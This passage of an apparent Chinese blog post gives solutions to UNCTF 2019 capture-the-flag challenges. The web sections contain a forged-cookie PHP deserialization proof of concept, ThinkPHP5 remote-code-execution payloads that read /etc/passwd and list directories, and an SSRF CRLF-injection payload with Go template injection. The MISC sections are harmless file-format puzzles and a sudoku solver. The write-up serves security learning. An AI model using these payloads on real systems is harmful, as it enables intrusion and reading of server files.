class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;forbidden = unserialize(<span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> debug();</span><br><span class="line"><span class="comment">//echo serialize($d);</span></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($d));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//30.png" alt="1573565551923"></p>
<p>token error,然后我们<strong>看到这里include了access.php,通过access.php.bak获得源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$hack_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$d = unserialize(<span class="keyword">$this</span>-&gt;funny);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那就是debug类中其实还有一个成员变量$funy,并且猜测access token 就是 hack token</p>
<p>那么最新的POCR如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">    <span class="keyword">public</span> $funny = <span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;forbidden = unserialize(<span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> debug();</span><br><span class="line"><span class="comment">//echo serialize($d);</span></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($d));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//31.png" alt="1573566521903"></p>
<p><strong>注:这里提供另外一种解法</strong></p>
<p>参考:<a href="https://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/#k-amp-k" target="_blank" rel="noopener">刀师傅的UNCTF2019web题解</a></p>
<p>我们明确我们是要触发<strong>__toString()</strong>方法,来获得flag.那么如何触发<strong>__toString</strong>方法呢?</p>
<p>除了利用debug::debug()中的<strong>echo $this-&gt;forbidden</strong></p>
<p>还有一处,代码如下[debug类中的__construct()]:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;vt($obj, $d);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ob-&gt;username !== <span class="string">"debuger"</span>) &#123;</span><br><span class="line">		setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vt</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ob != $obj) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ob = $obj;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!($obj <span class="keyword">instanceof</span> session)) &#123;</span><br><span class="line">		$d = $obj;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>username是可控的.并且看如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">$this</span>-&gt;ob-&gt;username !== <span class="string">"debuger"</span>)</span><br></pre></td></tr></table></figure>

<p>这个<strong>!==</strong>,是将<strong>$this-&gt;ob-&gt;username</strong>作为字符串进行比较.用来触发__toString正合适,并且debug.php中包含了access.php</p>
<p>所以我们可以编写POC如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=(<span class="keyword">new</span> debug());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $funny = <span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> session();</span><br><span class="line"><span class="comment">//echo serialize($d);</span></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($d));</span><br></pre></td></tr></table></figure>

<p><img src="/.com//43.png" alt="1573717001854"></p>
<h2 id="easy-patent"><a href="#easy-patent" class="headerlink" title="easy_patent"></a>easy_patent</h2><p>访问靶机(/public/index.php),字典跳转到not_safe.html</p>
<p><img src="/.com//32.png" alt="1573605187815"></p>
<p>没有任何信息,所以我们需要寻找信息泄漏点.</p>
<p>这题的hint:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hint1:tp框架特性 </span><br><span class="line">Hint2:万物皆有其根本，<span class="number">3.</span>x版本有，<span class="number">5.</span>x也有，严格来说只能算信息泄露</span><br></pre></td></tr></table></figure>

<p>个人认为这题对tp框架的掌握相当重要</p>
<p><strong>信息泄露,查看tp日志</strong></p>
<p>fuzz测试后,在/runtime/log/201910/02.log发现了信息泄露</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------------------</span><br><span class="line">[ <span class="number">2019</span><span class="number">-10</span><span class="number">-09</span>T15:<span class="number">06</span>:<span class="number">04</span>+<span class="number">08</span>:<span class="number">00</span> ] <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> GET localhost/<span class="keyword">public</span>/index.php</span><br><span class="line">[运行时间：<span class="number">0.386807</span>s] [吞吐率：<span class="number">2.59</span>req/s] [内存消耗：<span class="number">2</span>,<span class="number">211.72</span>kb] [文件加载：<span class="number">52</span>]</span><br><span class="line">[ info ] [ HEADER ] <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'cookie'</span> =&gt; <span class="string">'thinkphp_show_page_trace=0|0; hibext_instdsigdipv2=1'</span>,</span><br><span class="line">  <span class="string">'connection'</span> =&gt; <span class="string">'close'</span>,</span><br><span class="line">  <span class="string">'content-length'</span> =&gt; <span class="string">'33'</span>,</span><br><span class="line">  <span class="string">'x-requested-with'</span> =&gt; <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">  <span class="string">'content-type'</span> =&gt; <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">  <span class="string">'accept-encoding'</span> =&gt; <span class="string">'gzip, deflate'</span>,</span><br><span class="line">  <span class="string">'accept-language'</span> =&gt; <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">  <span class="string">'accept'</span> =&gt; <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">  <span class="string">'user-agent'</span> =&gt; <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0'</span>,</span><br><span class="line">  <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">)</span><br><span class="line">[ info ] [ PARAM ] <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'safe_key'</span> =&gt; <span class="string">'easy_pentesnt_is_s0fun'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>获得<strong>safe_key=easy_pentesnt_is_s0fun</strong></p>
<p>带上这个参数再一次访问靶机</p>
<p><img src="/.com//33.png" alt></p>
<p>了解到这个是tp5的框架.</p>
<p>尝试tp5的RCE,参考<a href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81" target="_blank" rel="noopener">tp5远程RCE</a></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=var_dump&amp;method=get&amp;server[REQUEST_METHOD]=abcdefg</span><br></pre></td></tr></table></figure>

<p><img src="/.com//34.png" alt></p>
<p>这里过滤掉很多能用的函数,关键字,最后发现可以使用的函数有<strong>show_source()</strong>以及<strong>scandir()</strong></p>
<p>show_source()读/etc/passwd</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=show_source&amp;&amp;get[]=/etc/passwd&amp;server[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//35.png" alt></p>
<p>没有发现flag的路径,由于scandir()返回的是数组,所以在这里无法输出….</p>
<p>参考:<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
<p><img src="/.com//36.png" alt="1573607591695"></p>
<p>所以，可以先传入<strong>filter[]=scandir&amp;get[]=/</strong>，这样读取完目录后。传入<strong>filter[]=var_dump</strong>，就可以成功输出扫描目录结果了</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=scandir&amp;&amp;get[]=/&amp;server[]=<span class="number">1</span>&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>

<p><img src="/.com//37.png" alt="1573607710179"></p>
<p>读home目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=scandir&amp;&amp;get[]=/home&amp;server[]=<span class="number">1</span>&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>

<p><img src="/.com//38.png" alt="1573607794544"></p>
<p>读flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=show_source&amp;&amp;get[]=/home/flag_1sh3r3.txt&amp;server[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//39.png" alt></p>
<p>获得flag</p>
<p>这道题,个人认为需要去了解tp的框架,还有fuzz,发现信息泄露的位置,因为是看学长的wp复现的,所以很多fuzz和思考的地方有待补充</p>
<p>参考:<a href="https://xz.aliyun.com/t/6661#toc-10" target="_blank" rel="noopener"><a href="https://xz.aliyun.com/t/6661#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6661#toc-10</a></a></p>
<h2 id="simple-doge"><a href="#simple-doge" class="headerlink" title="simple_doge"></a>simple_doge</h2><p>访问靶机<br><img src="/.com//40.png" alt="1573626038510"></p>
<p>当我们在查询框里输入<a href="http://127.0.0.1时,返回的是" target="_blank" rel="noopener">http://127.0.0.1时,返回的是</a></p>
<p><img src="/.com//41.png" alt="1573626123300"></p>
<p>猜测有SSrf,输入<a href="http://127.0.0.1:9527,有同样的回显">http://127.0.0.1:9527,有同样的回显</a></p>
<p>获取到index.php.swp</p>
<p><img src="/.com//42.png" alt="1573626444654"></p>
<p>这是Golang</p>
<p>name 参数的值即为输出的值， 当请求的 Header 中含有“Logic” 头时， name 的值即为“Logic” 头的值， 但是 SSRF 在一般情况下是无法控制服务器发出请求中的 Header 的， 此时就要考虑如何 控制 SSRF 中的 Header， 即 CRLF 注入， 这里实际用的是 CVE-2019-9741。 构造 Payload： “<a href="http://127.0.0.1:9527/?" target="_blank" rel="noopener">http://127.0.0.1:9527/?</a> HTTP/1.1\r\nLogic: abc”</p>
<p>在 Go 的模板中， 要插入一个对象的值， 则使用</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.对象名&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 回忆之前的源码泄露， flag 是放在</p>
<p>http.Request 中的， 在结构体中可以看到</p>
<p>http.Request 的名为 MyRequest， 所以模板注入的 Payload 为</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.MyRequest&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 完整的 Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9527&#x2F;? HTTP&#x2F;1.1\r\nLogic: &#123;&#123;.MyRequest&#125;&#125;</span><br></pre></td></tr></table></figure>







<h1 id="题解-MISC"><a href="#题解-MISC" class="headerlink" title="题解[MISC]"></a>题解[MISC]</h1><h2 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h2><p><img src="/.com//17.png" alt></p>
<p>就打游戏</p>
<h2 id="hidden-secret"><a href="#hidden-secret" class="headerlink" title="hidden_secret"></a>hidden_secret</h2><p>题目修改了一下，感觉变简单了不少。</p>
<p>给了三个文件，找了一个zip文件包分析一下，题目给的三个数据实际上是zip文件包的三部分，按照zip文件的格式，补齐缺失的数据，在头部加上<strong>50 4B</strong>，然后按顺序拼上1,2,3三个部分的文件。</p>
<p>保存成一个zip包，解压，发现里面有一个2.jpg，binwalk跑一下，分离出一个1.txt，内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"K&lt;jslc7b5'gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#"</span></span><br></pre></td></tr></table></figure>

<p>发现这是base92加密，</p>
<p>参考：<a href="https://www.cnblogs.com/pcat/p/11625834.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/pcat/p/11625834.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/11625834.html</a></a></p>
<p>解密脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base92</span><br><span class="line">c= base92.decode(<span class="string">"K&lt;jslc7b5'gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#"</span>)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure>

<p><img src="/.com//25.png" alt></p>
<h2 id="happy-puzzle"><a href="#happy-puzzle" class="headerlink" title="happy_puzzle"></a>happy_puzzle</h2><p>hint1: png吧 hint2：data不是图片，要拼图 hint3：idat数据块</p>
<p>参考链接：<a href="https://www.ffutop.com/posts/2019-05-10-png-structure/" target="_blank" rel="noopener">https://www.ffutop.com/posts/2019-05-10-png-structure/</a></p>
<p>​                   <a href="https://blog.csdn.net/xuchen16/article/details/82587908" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/82587908</a></p>
<p>png文件中必要的三个数据块：PNG文件格式头+IHDR+IDAT+IEND</p>
<p><img src="/.com//12.png" alt></p>
<p>接着IDAT块的数据</p>
<p><img src="/.com//13.png" alt></p>
<p>这题提供了很多.data文件，以及一个info.txt,告诉我们宽高是400。</p>
<p>思路：找一个png图片，将其PNG文件格式头+IHDR这一部分拿出来，作为flag.png的文件头。</p>
<p><img src="/.com//14.png" alt></p>
<p>然后IDAT的部分根据：长度(2800bytes)+IDAT标识符+data+CRC</p>
<p>注：在windows下查看CRC图片是不需要校验CRC码的，所以我们在CRC码的位置可以补0使用windows查看图片。</p>
<p><img src="/.com//15.png" alt></p>
<p><img src="/.com//16.png" alt></p>
<p>基于这个想法，我们把所有的.data文件全部补齐成IDAT块。</p>
<p>然后拼到IHDR后面，如果该IDAT块是这个位置的，那个图片出来一条，错了则是马赛克，手动拼完，出flag</p>
<p><img src="/.com//18.png" alt></p>
<h2 id="Easy-box"><a href="#Easy-box" class="headerlink" title="Easy_box"></a>Easy_box</h2><p>一个数独游戏，后来发现这个这里只要求每行每列的数字不一样就好了，暴力破解就好</p>
<p>参考：<a href="https://www.jb51.net/article/110940.htm" target="_blank" rel="noopener"><a href="https://www.jb51.net/article/110940.htm" target="_blank" rel="noopener">https://www.jb51.net/article/110940.htm</a></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">solution</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,board)</span>:</span></span><br><span class="line">    self.b = board</span><br><span class="line">    self.t = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,x,y,value)</span>:</span><span class="comment">#检查每行每列及每宫是否有相同项</span></span><br><span class="line">    <span class="keyword">for</span> row_item <span class="keyword">in</span> self.b[x]:</span><br><span class="line">      <span class="keyword">if</span> row_item == value:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> row_all <span class="keyword">in</span> self.b:</span><br><span class="line">      <span class="keyword">if</span> row_all[y] == value:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    row,col=x/<span class="number">3</span>*<span class="number">3</span>,y/<span class="number">3</span>*<span class="number">3</span></span><br><span class="line">    row3col3=self.b[row][col:col+<span class="number">3</span>]+self.b[row+<span class="number">1</span>][col:col+<span class="number">3</span>]+self.b[row+<span class="number">2</span>][col:col+<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> row3col3_item <span class="keyword">in</span> row3col3:</span><br><span class="line">      <span class="keyword">if</span> row3col3_item == value:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_next</span><span class="params">(self,x,y)</span>:</span><span class="comment">#得到下一个未填项</span></span><br><span class="line">    <span class="keyword">for</span> next_soulu <span class="keyword">in</span> range(y+<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">      <span class="keyword">if</span> self.b[x][next_soulu] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x,next_soulu</span><br><span class="line">    <span class="keyword">for</span> row_n <span class="keyword">in</span> range(x+<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">      <span class="keyword">for</span> col_n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> self.b[row_n][col_n] == <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">return</span> row_n,col_n</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>,<span class="number">-1</span> <span class="comment">#若无下一个未填项，返回-1</span></span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">try_it</span><span class="params">(self,x,y)</span>:</span><span class="comment">#主循环</span></span><br><span class="line">    <span class="keyword">if</span> self.b[x][y] == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):<span class="comment">#从1到9尝试</span></span><br><span class="line">        self.t+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.check(x,y,i):<span class="comment">#符合 行列宫均无条件 的</span></span><br><span class="line">    